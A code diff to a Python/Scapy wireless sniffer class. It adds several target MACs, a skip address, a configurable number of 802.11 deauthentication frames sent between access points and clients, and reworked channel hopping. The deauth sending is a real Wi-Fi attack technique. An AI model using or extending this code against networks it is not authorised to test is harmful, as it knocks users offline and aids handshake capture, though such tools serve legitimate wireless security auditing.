@@ -33,7 +33,9 @@ class Sniffer:
         open_network,
         Clients_,
         kill_time,
-        deauth=None
+        deauth=None,
+        packets=None,
+        skip=None
     ):
 
         self.mChannel = devices.get_channel(interface)
@@ -45,6 +47,12 @@ class Sniffer:
         self.mTarget = target
         self.mOpen = open_network
         self.mMAC = mac
+
+        if kill_time:
+            globalsx.gKILLTIME = kill_time
+
+        self.mDeauthPackets = packets
+        self.mSkip = skip
 
         print(channels)
 
@@ -90,6 +98,8 @@ class Sniffer:
 
             for i in globalsx.gDEAUTHS[self.mChannel]:
 
+                if i[0] == self.mSkip or i[1] == self.mSkip: return
+
                 dpkt1 = Dot11(
                     addr1=i[0],
                     addr2=i[1],
@@ -104,7 +114,7 @@ class Sniffer:
                 deauth_packets.append(dpkt2)
 
             for deauths in deauth_packets:
-                send(deauths, inter=float(0.001), count=int(1), verbose=False)
+                send(deauths, inter=float(0.001), count=int(self.mDeauthPackets), verbose=False)
 
             time.sleep(2)
 
@@ -122,7 +132,7 @@ class Sniffer:
 
             try:
 
-                if not globalsx.gFILTERCHANNEL:
+                if len(globalsx.gFILTERCHANNEL) != len(self.mTarget):
 
                     channel = choice(self.mChannels)
                     devices.set_channel(interface, channel)
@@ -130,19 +140,25 @@ class Sniffer:
 
                 # If target found.
                 else:
-                    devices.set_channel(interface,  globalsx.gFILTERCHANNEL)
-                    self.mChannel = globalsx.gFILTERCHANNEL
+                    if globalsx.gFILTERCHANNEL:
+                        channel = choice(globalsx.gFILTERCHANNEL)
+                    else:
+                        channel = choice(self.mChannels)
 
-                    break
+                    devices.set_channel(interface, channel)
+                    self.mChannel = channel
+
+                    if len(globalsx.gFILTERCHANNEL) == 1:
+                        break
 
                 if self.mDiagnose:
                     print("[CH]:   Channel Set to: {0}".format(self.mChannel))
 
-                time.sleep(1.75)
-
             except AttributeError:
                 print("Error on interpreter shutdown. Disregard.")
                 sys.exit(0)
+
+            time.sleep(2.75)
 
         # Exit hopper.
         return
@@ -290,9 +306,16 @@ class Sniffer:
         # Check if a target is set.
         if self.mTarget:
 
+            if len(self.mTarget) > 1:
+                filter_string = "ether host "+self.mTarget[0]
+                for client in self.mTarget[1:]:
+                    filter_string += " or ether host " + client
+            else:
+                filter_string = "ether host " + self.mTarget[0].lower()
+
             sniff(
                 iface=self.mInterface,
-                filter="ether host " + self.mTarget.lower(),
+                filter=filter_string,
                 prn=self.sniff_packets,
                 store=0
             )
@@ -313,29 +336,29 @@ class Sniffer:
 
         self.mPackets += 1
 
-        # try:
-        if packet_object.type == 0:
+        try:
+            if packet_object.type == 0:
 
-            if packet_object.subtype == 4:
-                self.handler_probe_request(packet_object)
+                if packet_object.subtype == 4:
+                    self.handler_probe_request(packet_object)
 
-            elif packet_object.subtype == 5 and packet_object.addr3 in self.mHidden:
-                self.handler_probe_response(packet_object)
+                elif packet_object.subtype == 5 and packet_object.addr3 in self.mHidden:
+                    self.handler_probe_response(packet_object)
 
-            elif packet_object.subtype == 8 and devices.check_valid_mac(packet_object.addr3):
-                self.handler_beacon(packet_object)
+                elif packet_object.subtype == 8 and devices.check_valid_mac(packet_object.addr3):
+                    self.handler_beacon(packet_object)
 
-            elif packet_object.subtype == 12:
-                self.handler_deauth(packet_object)
+                elif packet_object.subtype == 12:
+                    self.handler_deauth(packet_object)
 
-        elif packet_object.type == 1:
-            self.handler_ctrl(packet_object)
+            elif packet_object.type == 1:
+                self.handler_ctrl(packet_object)
 
-        elif packet_object.type == 2:
-            self.handler_data(packet_object)
+            elif packet_object.type == 2:
+                self.handler_data(packet_object)
 
-        # except AttributeError as e:
-        #     print("Error raised most likely during shutdown.", e)
+        except AttributeError as e:
+            print("Error raised most likely during shutdown." + str(e))
 
         return
 
@@ -419,8 +442,8 @@ class Sniffer:
             )
 
             # If target found set filter and cancel hopper thread.
-            if packet.addr3 == self.mTarget:
-                globalsx.gFILTERCHANNEL = int(channel)
+            if packet.addr3 in self.mTarget:
+                globalsx.gFILTERCHANNEL.append(int(channel))
 
             if self.mDiagnose:
                 print("[B-1]:  New Network: {0}".format(name.encode('utf-8')))
